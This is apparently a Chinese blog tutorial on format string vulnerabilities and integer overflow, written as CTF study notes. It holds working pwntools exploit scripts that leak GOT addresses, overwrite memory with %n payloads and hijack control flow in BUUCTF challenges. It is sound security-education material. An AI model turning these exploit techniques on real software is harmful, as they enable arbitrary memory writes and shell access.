---
title: 格式化字符串漏洞+整数溢出
date: 2023-07-23 11:04:14
tags: [Pwn,fmtstr]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstrcover.jpg"
categories: [Study]
---

------

格式化字符串漏洞（Format String Vulnerability）是一种常见的安全漏洞，它允许攻击者执行任意的代码或者读取敏感的内存信息。这种漏洞通常出现在使用printf函数或其变种时，开发者没有正确地处理用户输入的格式化字符串。攻击者可以通过在格式化字符串中插入一些特殊的控制字符，来控制printf函数的行为。

# 一、基本原理

## 1.1基本知识

格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式

|          函数          | 基本介绍                               |
| :--------------------: | :------------------------------------- |
|         printf         | 输出到 stdout                          |
|        fprintf         | 输出到指定 FILE 流                     |
|        vprintf         | 根据参数列表格式化输出到 stdout        |
|        vfprintf        | 根据参数列表格式化输出到指定 FILE 流   |
|        sprintf         | 输出到字符串                           |
|        snprintf        | 输出指定字节数到字符串                 |
|        vsprintf        | 根据参数列表格式化输出到字符串         |
|       vsnprintf        | 根据参数列表格式化输出指定字节到字符串 |
|      setproctitle      | 设置 argv                              |
|         syslog         | 输出日志                               |
| err, verr, warn, vwarn | 其它输出函数                           |

以printf() 为例，它的第一个参数就是格式化字符串 ："Color %s,Number %d,Float %4.2f"，然后 printf 函数会根据这个格式化字符串来解析对应的其他参数。

```c
#include <stdio.h>
int main()
{
   printf("Color %s,Number %d,Float %4.2f","red",123456,3.14);  
   return 0;
}//output: Color red,Number 123456,Float 3.14
```

一些格式化字符串的含义：

- %d - 十进制 - 输出十进制整数
- %s - 字符串 - 从内存中读取字符串
- %x - 十六进制 - 输出十六进制数
- %c - 字符 - 输出字符
- %p - 指针 - 指针地址
- %n - 到目前为止所写的字符数

## 1.2 栈内存分布

以如下程序为例，输入字符s以后，程序会输出包括s在内的5个字符。%0.8x表示以十六进制形式打印无符号整数值，宽度为8位，左侧用0填充。

```c
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

在printf下断点，输入2以后栈分布如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf1.png?x-oss-process=style/watermark)

查看main的反汇编，可知esp所指的位置为printf的返回地址，紧接着是格式化字符串，然后是各个参数。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf2.png?x-oss-process=style/watermark)

即printf栈结构如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf3.png?x-oss-process=style/watermark)

继续运行，printf输出：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf4.png?x-oss-process=style/watermark)

然后程序执行到printf(s)的地方，s并没有指定它的格式化字符串，它的栈结构：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf5.png?x-oss-process=style/watermark)

可以看到，程序压入了两个‘2’在栈里面，也就是本来作为格式化字符串的地方压入了s，接着执行程序，输出s然后结束。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf6.png?x-oss-process=style/watermark)

## 1.3 溢出原理

如果我们输入的s不是一个正常字符，而是一个格式化字符串呢？再次调试，输入 %0.8x。栈结构：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf7.png?x-oss-process=style/watermark)

第一个printf正常输出：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf8.png?x-oss-process=style/watermark)

执行到printf(s)，没有指定的格式化字符串，压入两个 %0.8x：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf9.png?x-oss-process=style/watermark)

此时，程序会将第一个%0.8x当成指定的格式化字符串，从而输出十六进制长度为8位的数值，即输出为ffffd010。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf10.png?x-oss-process=style/watermark)

输入三个%08x.%08x.%08x时，由于没有指定参数，会将栈以外的其它地方当成参数输出。如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf11.png?x-oss-process=style/watermark)

也就是说，我们可以利用这种方式，泄露栈的其它地址。可以使用%3\$x快速打印出第3个参数的值：%3\$x 是一个格式说明符，$ 符号用于指定参数的位置，x 表示以十六进制格式输出参数值，表示将以十六进制格式输出第三个参数的值。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf12.png?x-oss-process=style/watermark)

# 二、攻击原理

参考链接：https://www.bilibili.com/video/BV19A411t7XF/?spm_id_from=333.999.0.0&vd_source=4481f768294d5110af6b9e0ab6a40ddd

## 2.1 泄露地址

之前的方法是泄露栈上的变量值，没法泄露变量的地址。但是如果我们将某个函数got表的地址输入进去，利用格式化字符串打印got表中的内容，也就是函数的真实地址，利用libc偏移，就可以泄露出任意函数的地址栏了。假设这个地址存放的位置是printf的第k个参数，我们可以使用%k$x，将其打印出来。

确定格式化字符串是第几个参数，一般可以通过 [tag]%p%p%p%p%p%p%p%p%p 来实现，如果输出的内容跟我们前面的 tag 重复了，那就说明我们找到了，但是不排除栈上有些其他变量也是这个值，所以可以用一些其他的字符进行再次尝试。

输入AAAA%p%p%p%p%p%p%p（%p以指针格式输出参数），栈结构如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf13.png?x-oss-process=style/watermark)

将第一行AAAA%p%p%p%p%p%p%p当作格式化字符串，从%p开始，printf开始寻找参数，如上图第一个参数为0xffffd010，第二个0xf7fcf410，第三个为0x1，第四个为‘AAAA%p%p%p%p%p%p%p’，A的十六进制为41，%的十六进制为25，p的十六进制为70，8位一输出，即0x41414141（AAAA）0x70257025(%p%p)

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf14.png?x-oss-process=style/watermark)

即这里k=4，溢出结构如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf15.png?x-oss-process=style/watermark)

yichen大佬用的使scanf的got地址，我调试了好几次，发现函数__x86.get_pc_thunk（获取在加载时动态定义的地址）没有加载下一条指令地址（也就是printf），然后地址一直打印不出来，也不知道为什么，也不知道怎么解决（就是上面AAAA%p%p%p%p%p%p%p前面0x1的位置，本来应该是个地址的）。然后我在代码里面加了一句puts("Hello world!"); 重新编译后后，使用puts函数的got地址打印，打印成功了：

exp：

```python
from pwn import *
sh = process('./fs1')
elf = ELF('./fs1')
puts_got = elf.got['puts']
print hex(puts_got)
gdb.attach(sh,'b *0x8048517')
payload = p32(puts_got) + '%4$s' #payload为puts的got地址
print payload
sh.sendline(payload)
sh.recvuntil('%4$s\n')
print hex(u32(sh.recv()[4:8])) #后四个字节为打印出来的地址
sh.interactive()
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf16.png?x-oss-process=style/watermark)

调试结果：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf17.png?x-oss-process=style/watermark)

## 2.2 覆盖地址

%n，不输出字符，但是把已经成功输入的字符个数写入对应的整型指针参数所指的变量。只要变量对应的地址可写，就可以利用格式化字符串来改变其对应的值。看一下%n的功能，代码如下：

```c
#include <stdio.h>
int main()
{
   int s;
   printf("123456789%n s:",&s);
   printf("%d",s);
   return 0;
}
```

如上，%n统计之前的字符，并将其写入s所在的地址中，也就是s存储的就是9，运行结果：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf18.png?x-oss-process=style/watermark)

如果我们的s是一个地址的话，就可以使用%n改变地址里面的值了，也就达到了我们覆盖地址的作用。只要确定覆盖地址和相对偏移，就可以进行覆盖了。

举例，如下代码：

```c
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}
```

### 2.2.1 将c覆盖为16

c的地址已经打印出来了，只需要计算覆盖偏移，输入AAAA%p%p%p%p%p%p%p：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf19.png?x-oss-process=style/watermark)

可以看到第一次出现0x41时，是格式化字符串的第 6 个参数。使用%n将c的地址覆盖，覆盖为16：

```python
from pwn import *
sh = process('./overwrite')
c_addr = int(sh.recvuntil('\n', drop=True), 16)
print hex(c_addr)
payload = p32(c_addr) + 'a'*12 + '%6$n'#c的地址加上12个字符为16，将其写入到第6个参数，也就是我们输入的c_addr的位置。
print payload
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

成功输出modified.c：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf20.png?x-oss-process=style/watermark)

### 2.2.2  将a覆盖为2

我们可以通过ida文件知道a的地址，但是，我们将地址输入后，就已经是4个字节了，怎么才能使得%n统计的字符为2呢？可以先输入两个垃圾字符，然后再输入%n，最后再跟上我们的地址，即aa%k$n+addr，aa%k$n有6个字节，需要占两个栈空间，因此我们的参数位置就变成了第8个。

```python
from pwn import *
sh = process('./overwrite')
a_addr = 0x0804A024
payload = 'aa%8$naa' + p32(a_addr)#aa两个字节，%n=2，写入第8个参数，即a的地址里面
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

成功输出modified a for a small number：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf21.png?x-oss-process=style/watermark)

### 2.2.3 将b覆盖为0x12345678

这是一个很大的数，利用%n不太可能（需要太多垃圾数据），因此覆盖的时候我们直接以字节形式，一个字节一个字节的将这个数写进栈中。0x12345678按照小端序存储的方式为：78 56 34 12。

格式化字符串里面有两个标志：h和 hh。具体来说，h表示将整数作为带符号的短整数（16位）进行转换，输出结果为2个字符，如果整数大于16位，只保留后面的16位；而hh表示将整数作为带符号的字符（8位）进行转换，输出结果为1个字符，如果整数大于8位，只保留后面的8位。

举例，代码如下：

```c
#include <stdio.h>
int main()
{
   int num=30504;
   printf("以h格式输出：%hx\n",num);
   printf("以hh格式输出：%hhx\n",num);
   return 0;
}
```

输出结果：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf22.png?x-oss-process=style/watermark)

可以看到，以h格式输出时，整数30504被转换为2个字符的十六进制数"7728"，而以hh格式输出时，整数30504被转换为1个字符的十六进制数"28"。

```python
from pwn import *
sh = process('./overwrite')
b_addr=0x0804A028
payload = p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)
payload += '%104x'+'%6$hhn'+'%222x'+'%7$hhn'+'%222x'+'%8$hhn'+'%222x'+'%9$hhn'
#到 %6$hhn 前面有4个地址也就是16个字符，16+104=120=0x78，120+222=342=0x156，hh只取后面两个字节，就是0x56，
#同理，后面依次为0x234、0x312 即0x34、0x12。
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

也可以用pwntools自带的函数：

```python
sh.sendline(fmtstr_payload(6, {0x804A028:0x12345678}))
```

成功输出modified b for a big number! 

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf23.png?x-oss-process=style/watermark)

# 三、例题

buuctf题目：https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5

题目名字：[第五空间2019 决赛]PWN5

反汇编：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf24.png?x-oss-process=style/watermark)

可以看到存在格式化字符串漏洞，然后有system函数。程序首先会生成一个随机值，然后让用户输入一个值，如果该值与随机值相等，就可以获取shell。

可以看到随机值储存在0x804C44的地方，如果我们可以控制这个地方，就可以控制随机值，从而执行shell了。

利用格式化字符串漏洞：

先输入AAAA%p%p%p%p%p%p%p%p%p%p%p%p判断参数位置：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf26.png?x-oss-process=style/watermark)

可以看到第一次出现0x41时，是格式化字符串的第 10个参数。

```python
from pwn import *
p=remote('node4.buuoj.cn',28201)
payload = fmtstr_payload(10,{0x804C044:0x1})#将随机数写为1
p.recvuntil('name:')
p.sendline(payload)
p.recvuntil('passwd:')
p.sendline("1")#输入1，执行system
p.interactive()
```

成功获取flag:

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/pf25.png?x-oss-process=style/watermark)

# 四、整数溢出

整数溢出（Integer Overflow）是一种计算机程序中常见的安全漏洞，它发生在整数类型变量存储的值超过了其最大可能值时。在计算机中，整数类型的变量通常有一定的位数（位数取决于所使用的编程语言或数据类型），这限制了它们可以存储的值的范围。当一个整数变量的值超过了其最大可能值时，就会发生整数溢出。

## 4.1 原理

在C语言中，整数的基本数据类型分为短整型(short)，整型(int)，长整型(long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，如下所示：

|        类型        |     字节     |                             范围                             |
| :----------------: | :----------: | :----------------------------------------------------------: |
|     short int      | 2byte(word)  |        0~32767(0~0x7fff)  /  -32768~-1(0x8000~0xffff)        |
| unsigned short int | 2byte(word)  |                      0~65535(0~0xffff)                       |
|        int         | 4byte(dword) | 0~2147483647(0~0x7fffffff)  /  -2147483648~-1(0x80000000~0xffffffff) |
|    unsigned int    | 4byte(dword) |                  0~4294967295(0~0xffffffff)                  |
|      long int      | 8byte(qword) | 正: 0~0x7fffffffffffffff  /  负:0x8000000000000000~0xffffffffffffffff |
| unsigned long int  | 8byte(qword) |                     0~0xffffffffffffffff                     |

当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。

上界溢出有两种情况，一种是 `0x7fff + 1`， 另一种是 `0xffff + 1`。因为计算机底层指令是不区分有符号和无符号的，数据都是以二进制形式存在。所以 `add 0x7fff, 1 == 0x8000`，这种上界溢出对无符号整型就没有影响，但是在有符号短整型中，`0x7fff` 表示的是 `32767`，但是 `0x8000` 表示的是 `-32768`，用数学表达式来表示就是在有符号短整型中 `32767+1 == -32768`。第二种情况是 `add 0xffff, 1`，在有符号短整型中，`0xffff==-1，-1 + 1 == 0`，从有符号看这种计算没问题。但是在无符号短整型中，`0xffff == 65535, 65535 + 1 == 0`。

下届溢出一样也是有两种情况：

第一种是 `sub 0x0000, 1 == 0xffff`，对于有符号来说 `0 - 1 == -1` 没问题，但是对于无符号来说就成了 `0 - 1 == 65535`。

第二种是 `sub 0x8000, 1 == 0x7fff`，对于无符号来说是 `32768 - 1 == 32767` 是正确的，但是对于有符号来说就变成了 `-32768 - 1 = 32767`。

## 4.2 例题

题目链接：https://buuoj.cn/challenges#bjdctf_2020_babystack2 

反汇编：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/int1.png?x-oss-process=style/watermark)

可以看到if里面判断的是有符号整型，而read里面的是无符号整型，因此利用负数使得read读出的长度大于buf的长度。从而进行栈溢出。存在后门：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/int3.png?x-oss-process=style/watermark)

exp：

```python
from pwn import *
p=remote('node4.buuoj.cn',27552)
back_addr=0x0400726
p.recvuntil("the length of your name:\n")
p.sendline('-1')#利用整数溢出，使得read函数可以读取足够多的字节，进行栈溢出
payload ='a'*24+p64(back_addr)#read溢出到后门，直接获取shell
p.recvuntil("What's u name?\n")
p.sendline(payload)
p.interactive()
```

结果：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fmtstr/int2.png?x-oss-process=style/watermark)
